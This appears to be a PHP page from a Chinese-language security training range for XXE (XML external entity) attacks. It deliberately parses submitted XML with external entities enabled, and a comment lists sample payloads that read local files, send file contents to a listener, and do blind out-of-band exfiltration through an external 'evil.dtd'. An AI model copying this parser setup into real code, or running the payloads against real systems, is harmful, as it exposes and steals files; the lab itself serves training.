<?php
include "../../../includes/auth.php";
session_require_login();
$result = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['xml'])) {
    $xml = $_POST['xml'];
    libxml_disable_entity_loader(false);
    $data = simplexml_load_string($xml, null, LIBXML_NOENT);
    if ($data === false) {
        $result = "解析失败";
    } else {
        $result = "解析成功";
    }
}
/*
<?xml version="1.0"?>
<!DOCTYPE user[
    <!ENTITY name "admin"> 实体的定义
] >
<user>
    <name>&name;</name> 通过实体替换进行访问内容
</user>

<?xml version="1.0"?>
<!DOCTYPE user[
     <!ENTITY xxe SYSTEM "test.txt">
]>
<user>
    <name>&xxe;</name>
</user>

测试本地监视器：
<?xml version="1.0"?>
<!DOCTYPE user[
    <!ENTITY xxe SYSTEM "http://127.0.0.1:9999/?data=test.txt">
]>
<user>
    <name>&xxe;</name>
</user>

进行盲注发送到本地监视器
<?xml version="1.0"?>
<!DOCTYPE user[
    <!ENTITY % ext SYSTEM "evil.dtd">
    %ext;
    %send;
]>
<user>
    <name>&xxe;</name>
</user>
 */
?>

<?php
include "../../../includes/header.php";
?>
<div class="main-center">
    <div class="login-box">
        <?php echo $result; ?>
        <div class="vuln-title">XXE靶场测试</div>
        <div class="vuln-desc">请输入XML内容</div>
        <form method="POST">
            <input type="text" name="xml"> <br>
            <input type="submit" value="提交">
        </form>
    </div>
</div>
<?php
include "../../../includes/footer.php";
?>